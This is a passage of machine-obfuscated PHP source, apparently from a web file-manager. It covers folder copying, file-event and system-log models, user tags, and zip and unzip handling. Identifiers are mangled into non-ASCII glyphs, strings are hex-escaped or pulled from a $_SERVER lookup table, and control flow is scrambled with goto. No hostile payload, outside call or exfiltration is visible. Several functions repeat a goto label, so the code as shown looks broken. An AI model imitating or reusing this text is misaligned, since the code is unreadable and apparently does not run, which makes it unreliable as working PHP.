!0); goto Dڹ; B߆: } public function copyFolderFromIO($B֯, $bԍ˵, $f, $fޡ, $DӢԒ) { goto eƍ; D䅋: if ($C񴵩) { $this->{$_SERVER[拘][1777]}($C񴵩); } $this->{$_SERVER[拘][1815]}($B֯, $bԍ˵, $BĽ, $fޡ, $dبꕅ, $DӢԒ); if ($BĽ) { $this->{$_SERVER[拘][1771]}($BĽ); } goto fׅ; fׅ: $this->{$_SERVER[拘][1770]}(); $C˂[64]($C˂[1772])->{$_SERVER[拘][1161]}($dبꕅ[$C˂[1766]], array(), !0); $C˂[64]($C˂[1671])->{$_SERVER[拘][1773]}($BĽ); goto E; E: $this->{$_SERVER[拘][1774]}($dبꕅ[$C˂[1767]]); $C˂[64]($C˂[18])->{$_SERVER[拘][1775]}($dبꕅ[$C˂[1765]]); $C˂[64]($C˂[18])->{$_SERVER[拘][62]}($dبꕅ[$C˂[1814]]); goto D; E: $C񴵩 = $this->{$_SERVER[拘][393]}($f, $BЧ); $BĽ = $this->{$_SERVER[拘][395]}($f, $BЧ, $fޡ); if (!$C񴵩 || $fޡ == REPEAT_RENAME_FOLDER) { $fޡ = !1; } goto D䅋; eƍ: $C˂ =& $_SERVER[拘]; $dبꕅ = array($C˂[1766] => array(), $C˂[1767] => array(), $C˂[1765] => array(), $C˂[1814] => array()); $BЧ = $B֯->{$_SERVER[拘][391]}($B֯->{$_SERVER[拘][392]}($bԍ˵)); goto E; D: $this->{$_SERVER[拘][1761]}($f); $this->{$_SERVER[拘][1762]}($f); return $BĽ; goto dț; dț: } private function _copyChildTo($Eճ, $A䇢, $e, $Bń, &$f, $Aˎޣ) { goto D̖; Dۜ؛: foreach ($C as &$eƥ) { goto BȉΔ; a: $eƥ[$cǲ[490]] = $cǲ[1404]($eƥ, $cǲ[490], 0); $eƥ[$cǲ[1740]] = $cǲ[1404]($eƥ, $cǲ[1740], 0); if (!isset($eƥ[$cǲ[1817]]) && $eƥ[$cǲ[1740]]) { $f[$cǲ[1814]][] = $eƥ[$cǲ[1740]]; } goto Cć; BȉΔ: if (isset($F[$eƥ[$cǲ[375]]])) { $eƥ = $F[$eƥ[$cǲ[375]]]; } $eƥ[$cǲ[503]] = $eƥ[$cǲ[400]] == $cǲ[557]; $eƥ[$cǲ[1793]] = $cǲ[1404]($eƥ, $cǲ[565], $cǲ[67]); goto a; Cć: if ($Bń) { $f阧׆ = $this->{$_SERVER[拘][1768]}($e, $eƥ[$cǲ[375]]); if ($f阧׆) { if ($eƥ[$cǲ[503]] || $Bń == REPEAT_SKIP) { continue; } if ($Bń == REPEAT_REPLACE) { $cϾ = $this->{$_SERVER[拘][1776]}($f阧׆); $Cቈ = $this->{$_SERVER[拘][1781]}($cϾ, $eƥ[$cǲ[1740]], $eƥ[$cǲ[490]]); if ($Cቈ) { $f[$cǲ[1765]][] = $eƥ[$cǲ[1740]]; } continue; } else { if ($Bń == REPEAT_RENAME) { $eƥ[$cǲ[375]] = $this->{$_SERVER[拘][1779]}($e, $eƥ[$cǲ[375]], $Bń, !1); } } } } if (!$eƥ[$cǲ[503]] && $eƥ[$cǲ[1740]]) { $f[$cǲ[1765]][] = $eƥ[$cǲ[1740]]; } $D[] = $this->{$_SERVER[拘][1783]}($eƥ, $F򶮿, $eƥ[$cǲ[375]]); goto dܜ; dܜ: } unset($eƥ); if (!empty($D)) { $this->{$_SERVER[拘][1161]}($D); } goto e󉛠; D̖: $cǲ =& $_SERVER[拘]; $F򶮿 = $this->{$_SERVER[拘][1776]}($e); $eꚉ = $Eճ->{$_SERVER[拘][397]}($A䇢, !1, !0); goto b; b: $C = $cǲ[153]($eꚉ[$cǲ[398]], $eꚉ[$cǲ[399]]); $F = $this->{$_SERVER[拘][1816]}($Eճ, $eꚉ[$cǲ[398]], $Aˎޣ); $D = array(); goto Dۜ؛; e󉛠: $b׫ = $this->{$_SERVER[拘][1780]}($e); $b׫ = $cǲ[413]($b׫, $cǲ[375]); foreach ($C as $eƥ) { $cϾ = $b׫[$eƥ[$cǲ[375]]]; $Aȑ = $cϾ[$cǲ[499]]; $this->{$_SERVER[拘][1785]}($cϾ, $f); if ($eƥ[$cǲ[400]] == $cǲ[557]) { $eƥ[$cǲ[40]] = $Eճ->{$_SERVER[拘][396]}($eƥ[$cǲ[40]]); $this->{$_SERVER[拘][1815]}($Eճ, $eƥ[$cǲ[40]], $Aȑ, $Bń, $f, $Aˎޣ); } } goto c; c: } private function _addFiles($Eɛ, $Fβ, $fĄ) { goto aۼ; a: foreach ($Fβ as &$cʑ) { goto Aܳ; Aܳ: $cʑ[$F緢[40]] = $Eɛ->{$_SERVER[拘][396]}($cʑ[$F緢[40]]); $Dи = $Eɛ->{$_SERVER[拘][651]}($cʑ[$F緢[40]]); $A = $Eɛ->{$_SERVER[拘][616]}($cʑ[$F緢[40]]); goto EٯϹ; e: $bِԈ[$A][] =& $cʑ; if ($F緢[37]($bِԈ[$A]) > 1) { $cʑ[$F緢[1817]] = !0; } goto cؑ; EٯϹ: if ($F緢[195]($A) > 10 && !isset($bِԈ[$A])) { $bِԈ[$A] = array(); } $cʑ[$F緢[703]] = $Dи; $cʑ[$F緢[518]] = $A; goto e; cؑ: } $aՌȋ = array($F緢[518] => array($F緢[359], $F緢[766]($bِԈ))); $Dȃ = $F緢[64]($F緢[514]); goto E㽥ɠ; e񺉈: return $cٴܜ; goto D̔; aۼ: $F緢 =& $_SERVER[拘]; if (!$Fβ || $F緢[37]($Fβ) == 0) { return array(); } $bِԈ = array(); goto a; E㽥ɠ: $C = $Dȃ->{$_SERVER[拘][501]}($aՌȋ)->{$_SERVER[拘][1042]}(); $C = $C ? $C : array(); foreach ($C as $F뵘) { if (!isset($bِԈ[$F뵘[$F緢[518]]])) { continue; } $fЙ = $bِԈ[$F뵘[$F緢[518]]]; foreach ($fЙ as &$cʑ) { $cʑ[$F緢[1740]] = $F뵘[$F緢[1740]]; $cʑ[$F緢[1817]] = !0; } unset($cʑ); } goto C; CӋ: foreach ($C as $F뵘) { if (!isset($bِԈ[$F뵘[$F緢[518]]])) { continue; } $Bӧ͂ =& $bِԈ[$F뵘[$F緢[518]]]; foreach ($Bӧ͂ as &$cʑ) { $cʑ[$F緢[1740]] = $F뵘[$F緢[1740]]; } unset($cʑ); } $cٴܜ = array(); foreach ($Fβ as $f) { $cٴܜ[$f[$F緢[375]]] = $f; } goto e񺉈; bㅗ: $aՌȋ = array($F緢[518] => array($F緢[359], $F緢[766]($bِԈ))); $C = $Dȃ->{$_SERVER[拘][501]}($aՌȋ)->{$_SERVER[拘][1042]}(); $C = $C ? $C : array(); goto CӋ; C: $Aǳ = array(); foreach ($Fβ as $b᥿) { if (isset($b᥿[$F緢[1817]]) && $b᥿[$F緢[1817]]) { continue; } $D = $Eɛ->{$_SERVER[拘][396]}($b᥿[$F緢[40]]); $F = $Dȃ->{$_SERVER[拘][1736]}($D, $b᥿[$F緢[490]], $b᥿[$F緢[703]], $b᥿[$F緢[518]], $b᥿[$F緢[375]], $fĄ); $Aǳ[] = $F; } $Dȃ->{$_SERVER[拘][1161]}($Aǳ); goto bㅗ; D̔: } } goto f٤; dȴ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\143\145\x5f\x65\166\145\x6e\x74"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\x54\151\x6d\x65", "\x74\x69\155\145", "\151\x6e\x73\x65\x72\164", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\144\x65\163\x63", '', "\151\156\163\145\162\164\54\x75\160\144\141\164\x65\x2c\163\145\154\145\143\164", "\152\163\x6f\x6e")); public function addEvent($aַݧ, $BÒ, $bǃ = '') { $cդ⣵ =& $_SERVER[拘]; $B߇ő = $cդ⣵[64]($cդ⣵[480])->{$_SERVER[拘][491]}($aַݧ); if (!$B߇ő) { return !1; } if ($bǃ && $cդ⣵[66]($bǃ)) { $bǃ = array($cդ⣵[1489] => $bǃ); } $dń = array($cդ⣵[1470] => $aַݧ, $cդ⣵[1490] => $B߇ő[$cդ⣵[483]], $cդ⣵[1445] => USER_ID, $cդ⣵[445] => $BÒ, $cդ⣵[1491] => $bǃ); return $this->{$_SERVER[拘][63]}($dń); } public function eventCreate($d֋, $d˪) { $F󸧡 =& $_SERVER[拘]; $fݎ = $F󸧡[64]($F󸧡[480])->{$_SERVER[拘][491]}($d֋); $A = array($F󸧡[1492] => $d˪, $F󸧡[375] => $fݎ[$F󸧡[375]]); return $this->{$_SERVER[拘][1493]}($d֋, $F󸧡[1494], $A); } public function eventFileEdit($aǆƴ) { return $this->{$_SERVER[拘][1493]}($aǆƴ, $_SERVER[拘][1495]); } public function eventRecycle($A줗Љ, $eȞ᧓) { return $this->{$_SERVER[拘][1493]}($A줗Љ, $_SERVER[拘][1345], $eȞ᧓); } public function eventRemove($fۅ) { $BΉ =& $_SERVER[拘]; $d = $BΉ[64]($BΉ[480])->{$_SERVER[拘][491]}($fۅ); $fŗꕃ = $d[$BΉ[375]]; return $this->{$_SERVER[拘][1493]}($d[$BΉ[483]], $BΉ[1345], $fŗꕃ); } public function eventShare($Cޏ, $E˖Օ) { return $this->{$_SERVER[拘][1493]}($Cޏ, $_SERVER[拘][1496], $E˖Օ); } public function eventMove($aϫͼ, $b⮒, $cק) { goto D; Cã: $this->{$_SERVER[拘][1493]}($aϫͼ, $f鴶[370], $f); $Eԕ = $dʅ->{$_SERVER[拘][491]}($aϫͼ); $f = array($f鴶[499] => $Eԕ[$f鴶[499]], $f鴶[375] => $Eԕ[$f鴶[375]]); goto d혍; D: $f鴶 =& $_SERVER[拘]; $dʅ = $f鴶[64]($f鴶[480]); $Eԕ = $dʅ->{$_SERVER[拘][491]}($aϫͼ); goto D؜; D؜: $E̒ = $dʅ->{$_SERVER[拘][491]}($b⮒); $e䣏 = $dʅ->{$_SERVER[拘][491]}($cק); $f = array($f鴶[1497] => $b⮒, $f鴶[1498] => $E̒[$f鴶[375]], $f鴶[1499] => $cק, $f鴶[1500] => $e䣏[$f鴶[375]]); goto Cã; d혍: $this->{$_SERVER[拘][1493]}($b⮒, $f鴶[1501], $f); goto Fۜ; Fۜ: } public function eventCopy($e) { $this->{$_SERVER[拘][1502]}($e, $_SERVER[拘][369]); } public function eventRename($bɲ, $f킥, $AשŮ) { $aʠ =& $_SERVER[拘]; $fݳ = array($aʠ[1497] => $f킥, $aʠ[1499] => $AשŮ); return $this->{$_SERVER[拘][1493]}($bɲ, $aʠ[1503], $fݳ); } public function eventAddComment($A, $A) { return $this->{$_SERVER[拘][1493]}($A, $_SERVER[拘][1504], $A); } public function eventAddDesc($BĹ, $E཮) { return $this->{$_SERVER[拘][1493]}($BĹ, $_SERVER[拘][1505], $E཮); } public function listBySource($b٣қ) { goto D; D: $dߋ =& $_SERVER[拘]; $dӐѥ = $dߋ[64]($dߋ[480])->{$_SERVER[拘][491]}($b٣қ); $a͚ = array($dߋ[1470] => $b٣қ); goto a֡; F۽ԫ: $dߋ[29]($e); goto dԧ; a֡: if ($dӐѥ[$dߋ[503]] == $dߋ[162]) { $a󚋶԰ = $this->{$_SERVER[拘][1506]}(array($dߋ[483] => $b٣қ)); $cÞ = $this->{$_SERVER[拘][1506]}(array($dߋ[483] => array($dߋ[359], $a󚋶԰))); $a󚋶԰ = $dߋ[153]($a󚋶԰, $cÞ); $dߋ[1419]($a󚋶԰, $b٣қ); $a͚ = array($dߋ[499] => array($dߋ[359], $a󚋶԰)); } $e = $this->{$_SERVER[拘][501]}($a͚)->{$_SERVER[拘][1450]}($dߋ[1507])->{$_SERVER[拘][1508]}(); $e = $this->{$_SERVER[拘][1509]}($e, $b٣қ); goto F۽ԫ; dԧ: } private function eventListParse($B, $C턂) { goto a˾̵س; f: foreach ($Bݸը as &$c̡) { $Fô =& $c̡[$bԅ[1511]]; if ($c̡[$bԅ[400]] == $bԅ[370]) { $Fô[$bԅ[1497]] = $cм[$Fô[$bԅ[1497]]]; $Fô[$bԅ[1499]] = $cм[$Fô[$bԅ[1499]]]; } if ($c̡[$bԅ[400]] == $bԅ[1501]) { $Fô[$bԅ[499]] = $cм[$Fô[$bԅ[499]]]; } $c̡[$bԅ[1516]] = $cм[$c̡[$bԅ[499]]]; $c̡[$bԅ[1517]] = $cм[$c̡[$bԅ[1510]]]; $c̡[$bԅ[1518]] = $b乷[$c̡[$bԅ[1512]]]; } $B[$bԅ[1155]] = $Bݸը; return $B; goto Bݚ; f: $c҃т = $bԅ[413]($Bݸը, $bԅ[67], $bԅ[1510]); foreach ($Bݸը as $c̡) { $Fô = $c̡[$bԅ[1511]]; if ($c̡[$bԅ[400]] == $bԅ[370]) { $cؼڽ[] = $Fô[$bԅ[1497]]; $cؼڽ[] = $Fô[$bԅ[1499]]; } if ($c̡[$bԅ[400]] == $bԅ[1501]) { $cؼڽ[] = $Fô[$bԅ[499]]; } } $cؼڽ = $bԅ[153]($cؼڽ, $c҃т, array($C턂)); goto Fτ; a˾̵س: $bԅ =& $_SERVER[拘]; $Bݸը = $B[$bԅ[1155]]; $cؼڽ = $bԅ[413]($Bݸը, $bԅ[67], $bԅ[499]); goto f; Fτ: $cĲ = $bԅ[413]($Bݸը, $bԅ[67], $bԅ[1512]); $b乷 = $bԅ[64]($bԅ[1513])->{$_SERVER[拘][1514]}($cĲ); $cм = $bԅ[64]($bԅ[474])->{$_SERVER[拘][1515]}($cؼڽ); goto f; Bݚ: } private function _sourceList($fՉ) { $C =& $_SERVER[拘]; $b = 100; $Aᄫ = $C[1519]; $fۿ՝ţ = $C[64]($C[480])->{$_SERVER[拘][1164]}($C[499])->{$_SERVER[拘][501]}($fՉ)->{$_SERVER[拘][1520]}($b)->{$_SERVER[拘][1450]}($Aᄫ)->{$_SERVER[拘][1042]}(); $fۿ՝ţ = $C[413]($fۿ՝ţ, $C[67], $C[499]); return $fۿ՝ţ; } public function removeBySource($f) { $b = array($_SERVER[拘][1470] => $f); $this->{$_SERVER[拘][501]}($b)->{$_SERVER[拘][62]}(); } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\x74\x61\x67\114\151\163\164"; public $modelType = "\125\x73\145\x72\x4f\x70\x74\151\157\156"; public $field = array("\156\141\x6d\145", "\163\x74\x79\x6c\x65", "\x73\x6f\162\x74"); public function listData($FƝ = false, $dĨ۸ = "\x73\157\162\x74", $dŸ = false) { return parent::listData($FƝ, $dĨ۸, $dŸ); } public function remove($Cԩ˵) { return parent::remove($Cԩ˵); } public function add($f̫, $b = "\154\141\x62\145\154\x2d\x67\162\145\x79\x2d\x6e\157\x72\x6d\x61\154") { $D =& $_SERVER[拘]; if ($this->{$_SERVER[拘][1461]}($f̫)) { return !1; } $e = array($D[1453] => $f̫, $D[1521] => $b, $D[1454] => $this->{$_SERVER[拘][1522]}($D[1007]) + 1); return parent::insert($e); } public function update($d͓, $A) { $dΈ =& $_SERVER[拘]; $b = $this->{$_SERVER[拘][504]}($d͓); $e舨 = $this->{$_SERVER[拘][1461]}($A[$dΈ[375]]); if (!$b || $e舨 && $e舨[$dΈ[414]] != $b[$dΈ[414]]) { return !1; } return parent::update($d͓, $A); } public function moveTop($eÆ) { $Eҍ =& $_SERVER[拘]; $B = parent::listData(); $Aי؆ = $this->{$_SERVER[拘][1522]}($Eҍ[1006]); foreach ($B as &$Bƥ) { if ($Bƥ[$Eҍ[414]] == $eÆ) { $Bƥ[$Eҍ[1476]] = $Aי؆; continue; } $Bƥ[$Eҍ[1476]] += 1; } return parent::resetData($B); } public function moveBottom($eܶώ) { $dΥ =& $_SERVER[拘]; $Cؙ = $this->{$_SERVER[拘][1522]}($dΥ[1007]) + 1; return parent::update($eܶώ, array($dΥ[1476] => $Cؙ)); } public function resetSort($D) { $cϼ =& $_SERVER[拘]; $DÛ = array(); for ($ẻ = 0; $ẻ < $cϼ[37]($D); $ẻ++) { $DÛ[$D[$ẻ] . $cϼ[67]] = $ẻ + 1; } $DĖ = parent::listData(); foreach ($DĖ as &$f쒷) { $fト = $DÛ[$f쒷[$cϼ[414]]]; $f쒷[$cϼ[1476]] = $fト ? $fト : $f쒷[$cϼ[1476]]; } return parent::resetData($DĖ); } private function getSort($f) { $D =& $_SERVER[拘]; $b = parent::listData(); $B = $D[413]($b, $D[67], $D[1476]); if (!$B) { $B = array(0); } $Aȉ = $f == $D[1007] ? $D[1143]($B) : $D[1524]($B); return $D[455]($Aȉ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\124\151\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\x73\x65\x72\x74", "\146\x75\x6e\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->{$_SERVER[拘][1525]}(); } public function allTypeList() { $Cϲⷧ =& $_SERVER[拘]; return array($Cϲⷧ[1526] => $Cϲⷧ[387]($Cϲⷧ[1527]), $Cϲⷧ[1528] => $Cϲⷧ[387]($Cϲⷧ[1529]), $Cϲⷧ[1530] => $Cϲⷧ[387]($Cϲⷧ[1531]), $Cϲⷧ[1532] => $Cϲⷧ[387]($Cϲⷧ[1533]), $Cϲⷧ[1534] => $Cϲⷧ[387]($Cϲⷧ[1535]), $Cϲⷧ[1536] => $Cϲⷧ[387]($Cϲⷧ[1537]), $Cϲⷧ[1538] => $Cϲⷧ[387]($Cϲⷧ[1539]), $Cϲⷧ[1540] => $Cϲⷧ[387]($Cϲⷧ[1541]), $Cϲⷧ[1542] => $Cϲⷧ[387]($Cϲⷧ[1543]), $Cϲⷧ[1544] => $Cϲⷧ[387]($Cϲⷧ[1545]), $Cϲⷧ[1546] => $Cϲⷧ[387]($Cϲⷧ[1547]), $Cϲⷧ[1548] => $Cϲⷧ[387]($Cϲⷧ[1549]), $Cϲⷧ[1550] => $Cϲⷧ[387]($Cϲⷧ[1551]), $Cϲⷧ[1552] => $Cϲⷧ[387]($Cϲⷧ[1553]), $Cϲⷧ[1554] => $Cϲⷧ[387]($Cϲⷧ[1555]), $Cϲⷧ[1556] => $Cϲⷧ[387]($Cϲⷧ[1557]), $Cϲⷧ[1558] => $Cϲⷧ[387]($Cϲⷧ[1559]), $Cϲⷧ[1560] => $Cϲⷧ[387]($Cϲⷧ[1561]), $Cϲⷧ[1562] => $Cϲⷧ[387]($Cϲⷧ[1563]), $Cϲⷧ[1564] => $Cϲⷧ[387]($Cϲⷧ[1565]), $Cϲⷧ[1566] => $Cϲⷧ[387]($Cϲⷧ[1567]), $Cϲⷧ[1568] => $Cϲⷧ[387]($Cϲⷧ[1569]), $Cϲⷧ[1570] => $Cϲⷧ[387]($Cϲⷧ[1571]), $Cϲⷧ[1572] => $Cϲⷧ[387]($Cϲⷧ[1573]), $Cϲⷧ[1574] => $Cϲⷧ[387]($Cϲⷧ[1574]), $Cϲⷧ[1575] => $Cϲⷧ[387]($Cϲⷧ[1576]), $Cϲⷧ[1577] => $Cϲⷧ[387]($Cϲⷧ[1578]), $Cϲⷧ[1579] => $Cϲⷧ[387]($Cϲⷧ[1580]), $Cϲⷧ[1581] => $Cϲⷧ[387]($Cϲⷧ[1582]), $Cϲⷧ[1583] => $Cϲⷧ[387]($Cϲⷧ[1584]), $Cϲⷧ[1585] => $Cϲⷧ[387]($Cϲⷧ[1585]), $Cϲⷧ[1586] => $Cϲⷧ[387]($Cϲⷧ[1587]), $Cϲⷧ[1588] => $Cϲⷧ[387]($Cϲⷧ[1589]), $Cϲⷧ[1590] => $Cϲⷧ[387]($Cϲⷧ[1591]), $Cϲⷧ[1592] => $Cϲⷧ[387]($Cϲⷧ[1593]), $Cϲⷧ[1594] => $Cϲⷧ[387]($Cϲⷧ[1595]), $Cϲⷧ[1596] => $Cϲⷧ[387]($Cϲⷧ[1597])); } public function addLog($Dԑো, $aվݗ = array()) { goto eԇֺ; Eү: parent::add($aվݗ); goto F; C: $a׊ǩ = $CښƲ[93]($aվݗ) || $CښƲ[296]($aվݗ) ? $CښƲ[297]($aվݗ) : $aվݗ; if ($CښƲ[195]($a׊ǩ) >= 500) { $a׊ǩ = $CښƲ[297](array($CښƲ[1598] => $aվݗ[$CښƲ[1598]])); } $aվݗ = array($CښƲ[1599] => Session::sign(), $CښƲ[1445] => $cɍ, $CښƲ[400] => $Dԑো, $CښƲ[1491] => $a׊ǩ); goto Eү; eԇֺ: $CښƲ =& $_SERVER[拘]; if (!isset($this->typeList[$Dԑো])) { return; } $cɍ = USER_ID ? USER_ID : (isset($aվݗ[$CښƲ[1512]]) ? $aվݗ[$CښƲ[1512]] : 0); goto C; F: } public function remove($bƎϸ) { $this->{$_SERVER[拘][501]}(array($_SERVER[拘][447] => $bƎϸ))->{$_SERVER[拘][308]}(); } private function _makeOrder($F = '') { goto b; b: $cǢσ =& $_SERVER[拘]; $B = $cǢσ[558]; $eᎹߚ = array($cǢσ[1601] => $cǢσ[1602], $cǢσ[1603] => $cǢσ[1511]); goto Eǈ; Eǈ: $Cǈ = Input::get($cǢσ[1604], $cǢσ[359], $cǢσ[1605], array($cǢσ[1605], $cǢσ[1603])); $Cǈ = $eᎹߚ[$Cǈ]; $F = $F . "{$B}\x20{$Cǈ}"; goto fъܐ; fъܐ: return $this->{$_SERVER[拘][1450]}($F); goto d₋; d₋: } public function get($Cߛ = '') { goto cܦ; B: if ($Cߛ[$BӘ덍[400]]) { $e[$BӘ덍[400]] = $Cߛ[$BӘ덍[400]]; } $e蝅 = $this->{$_SERVER[拘][1608]}()->{$_SERVER[拘][501]}($e)->{$_SERVER[拘][1508]}(20); if (empty($e蝅[$BӘ덍[1155]])) { $BӘ덍[29](array(), !0, $e蝅[$BӘ덍[1156]]); } goto c; cܦ: $BӘ덍 =& $_SERVER[拘]; if (!$Cߛ) { $BӘ덍[29](array()); } $e = array($BӘ덍[400] => array($BӘ덍[359], $BӘ덍[766]($this->typeList)), $BӘ덍[558] => array($BӘ덍[1108], array($Cߛ[$BӘ덍[1606]], $Cߛ[$BӘ덍[1607]]))); goto B; c: $EČ = $BӘ덍[710]($BӘ덍[159](function ($fڋ) { return $fڋ[$_SERVER[拘][1512]]; }, $e蝅[$BӘ덍[1155]])); $Aτ = $BӘ덍[64]($BӘ덍[1513])->{$_SERVER[拘][1514]}($EČ); if ($Cߛ[$BӘ덍[400]] != $BӘ덍[1530]) { $this->{$_SERVER[拘][1609]}($e蝅[$BӘ덍[1155]], $Aτ); } else { $this->{$_SERVER[拘][1610]}($e蝅[$BӘ덍[1155]], $Aτ); } goto B񡜻; B񡜻: return $e蝅; goto a䤘; a䤘: } private function ipAddress(&$F) { $a =& $_SERVER[拘]; if (!empty($F[$a[1598]])) { $E = IpLocation::get($F[$a[1598]]); if ($E == $a[1611]) { $E = $a[1612]; } } else { $E = $a[387]($a[1613]); } $F[$a[1614]] = $E; } private function _processLoginLog(&$DЊӿ, $Aɋ) { $d =& $_SERVER[拘]; foreach ($DЊӿ as $f => $bӂ¶) { $bÊ = $d[738]($bӂ¶[$d[1511]], !0); $e𒻾 = array($d[375] => $Aɋ[$bӂ¶[$d[1512]]][$d[375]], $d[1615] => $Aɋ[$bӂ¶[$d[1512]]][$d[1615]], $d[1616] => $d[387]($d[1531])); unset($bӂ¶[$d[1511]]); $bӂ¶ = $d[153]($bӂ¶, $e𒻾, $bÊ); $this->{$_SERVER[拘][1617]}($bӂ¶); $DЊӿ[$f] = $bӂ¶; } } private function _processLog(&$aރ, $BΝ̎) { $Aאʻ =& $_SERVER[拘]; foreach ($aރ as $E => $f륈ï) { goto D; D: $f륈ï[$Aאʻ[375]] = isset($BΝ̎[$f륈ï[$Aאʻ[1512]]][$Aאʻ[375]]) ? $BΝ̎[$f륈ï[$Aאʻ[1512]]][$Aאʻ[375]] : $Aאʻ[387]($Aאʻ[1613]); $f륈ï[$Aאʻ[1615]] = isset($BΝ̎[$f륈ï[$Aאʻ[1512]]][$Aאʻ[1615]]) ? $BΝ̎[$f륈ï[$Aאʻ[1512]]][$Aאʻ[1615]] : $Aאʻ[67]; $f륈ï[$Aאʻ[1616]] = isset($this->typeList[$f륈ï[$Aאʻ[400]]]) ? $this->typeList[$f륈ï[$Aאʻ[400]]] : $Aאʻ[387]($Aאʻ[1613]); goto dꎠ; dꎠ: $Dόɉ = $Aאʻ[738]($f륈ï[$Aאʻ[1511]], !0); $f륈ï[$Aאʻ[1598]] = isset($Dόɉ[$Aאʻ[1598]]) ? $Dόɉ[$Aאʻ[1598]] : $Aאʻ[67]; $this->{$_SERVER[拘][1617]}($f륈ï); goto eؒ; eؒ: unset($f륈ï[$Aאʻ[1511]]); $aރ[$E] = $f륈ï; goto f̜; f̜: } } } goto fϔ; aǾ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $dĝ; if (!$dĝ) { $Fҵ = IO::init($_SERVER[拘][44]); } return $Fҵ; } private static function iconvSystem($E) { return self::local()->{$_SERVER[拘][544]}($E); } private static function iconvApp($Aỡ) { return self::local()->{$_SERVER[拘][407]}($Aỡ); } public static function zip($eƖ, $c䌺 = "\x7a\151\160", $a֎¨ = '', $c仪 = REPEAT_RENAME) { goto B첪э; D񑄥: if ($f[37]($D) > 1) { $AÔ = isset($F֢[$f[714]]) ? $F֢[$f[714]] : $F֢[$f[40]]; $Aȟ = $f[715]($f[716]($AÔ)); } $C׉۬ = $d; if (!$C׉۬) { $C׉۬ = $f[716]($F֢[$f[40]]); $bԃ׻ = IO::info($C׉۬); if (!$bԃ׻[$f[717]]) { $f[29]($f[387]($f[718]), !1); } } goto aӜݠͳ; Eۦ: foreach ($D as $CѼ => $dߴ) { $D[$CѼ] = self::iconvSystem($dߴ); } KodArchive::create($Aҹ, $D); if (!IO::exist($Eۏ)) { if ($d) { $f[721]($d); } $f[29]($f[387]($f[722]), !1); } goto b; b: if ($a֎¨ || !$d) { if ($d && $f[169]($d, TEMP_FILES)) { $F = $D = array(); $f[723]($C׉۬, $F, $D, 0); foreach ($F as $Dê) { $f[721]($Dê); } foreach ($D as $fτ) { if ($fτ == $Aҹ) { continue; } $f[409]($fτ); } } return $Eۏ; } $CÄ = self::pathFather($F֢[$f[40]]); $CÄ = $Eۂ->{$_SERVER[拘][378]}($Eۂ->{$_SERVER[拘][544]}($CÄ)); goto A; aӜݠͳ: $Eۏ = $C׉۬ . $Aȟ . $f[348] . $c䌺; $Eۏ = $f[719]($Eۏ, $f[67], $c仪); $Aҹ = self::iconvSystem($Eۏ); goto Eۦ; Eۥ܆: $d = !1; if (!$a֎¨ && $Eۂ->{$_SERVER[拘][380]}() == $f[382]) { $D = self::zipFileList($eƖ); } else { $d = $a֎¨ ? $a֎¨ : TEMP_FILES . $f[713] . $f[50]() . $f[405](5) . $f[44]; $f[403]($d); $D = self::zipFileList($eƖ, $d); } $Aȟ = $F֢[$f[375]]; goto D񑄥; A: $dɲ = self::move($Eۏ, $CÄ, $c仪); if (!$dɲ) { $f[721]($d); $f[29]($f[387]($f[722]), !1); } $f[721]($d); goto f; B첪э: $f =& $_SERVER[拘]; $Eۂ = self::init($eƖ[0][$f[40]]); $F֢ = self::info($eƖ[0][$f[40]]); goto Eۥ܆; f: return $dɲ; goto FУ; FУ: } public static function unzip($F踫, $AɎ = "\162\x65\160\154\x61\143\x65") { goto EĎ; Eތ: $bЎ[403]($A͛); $DĂ = $A͛ . $bЎ[348] . $Bܐ[$bЎ[565]]; if (!@$bЎ[48](self::iconvSystem($DĂ))) { $F = self::localFilePath($a, $Bܐ[$bЎ[565]]); $DĂ = $F ? $F : parent::download($a, $DĂ); } goto e; bÇ: self::archiveExt(); if (!$b[$bЎ[731]]) { $bЎ[29]($bЎ[732] . $b[$bЎ[733]], !1); } $bЎ[723]($A͛, $Fý, $c۶릂, 0); goto Eտ; dʋ: if (!$F) { $bЎ[409]($DĂ); } return !0; goto a㜄; e: $DĂ = self::iconvSystem($DĂ); $A = isset($F踫[$bЎ[728]]) ? $F踫[$bЎ[728]] : $bЎ[729]; $b = KodArchive::extract($DĂ, $A͛ . $bЎ[44], $A); goto bÇ; EĎ: $bЎ =& $_SERVER[拘]; $a = $F踫[$bЎ[40]]; $aﺧѯ = $F踫[$bЎ[724]]; goto f쎚; Bƴ: $f¹ = self::tmpFileName($Bܐ); $A͛ = TEMP_FILES . $f¹; $bЎ[721]($A͛); goto Eތ; f쎚: if (!($Bܐ = parent::info($a))) { $bЎ[29]($bЎ[387]($bЎ[725]), !1); } if (!($F = parent::infoFull($aﺧѯ))) { $aﺧѯ = parent::mkdir($aﺧѯ); $F = array($bЎ[40] => $aﺧѯ); } else { if (isset($F[$bЎ[499]]) && $bЎ[70]($F[$bЎ[40]], $bЎ[44]) != $bЎ[70]($aﺧѯ, $bЎ[44])) { $Cص = KodIO::make($F[$bЎ[483]]); $bԎ = parent::fileNameAuto($Cص, $F[$bЎ[375]], REPEAT_RENAME_FOLDER, !0); $aﺧѯ = parent::mkdir($Cص . $bԎ); $F = array($bЎ[40] => $aﺧѯ); } } $aﺧѯ = $F[$bЎ[40]]; goto Bƴ; Eտ: $fʱ㯡 = $bЎ[153]($Fý, $c۶릂); foreach ($fʱ㯡 as $Bͼ) { $Bͼ = self::iconvApp($Bͼ); self::move($Bͼ, $aﺧѯ, $AɎ); } $bЎ[721]($A͛); goto dʋ; a㜄: } public function unzipList($c׶) { goto Eߏ; CԴΏĩ: self::setContent($eǟ, $aԽ); if ($cյ[37]($Fީ[$cյ[733]]) >= $dǅ) { $cյ[29]($cյ[596]($cյ[387]($cյ[739]), $cյ[37]($Fީ[$cյ[733]])), !1); } return $Fީ[$cյ[733]]; goto b󚍮; DԨ: $c̻Ƞ = self::info($Cո); $A٣Ш = self::tmpFileName($c̻Ƞ); if (isset($Eق)) { $F 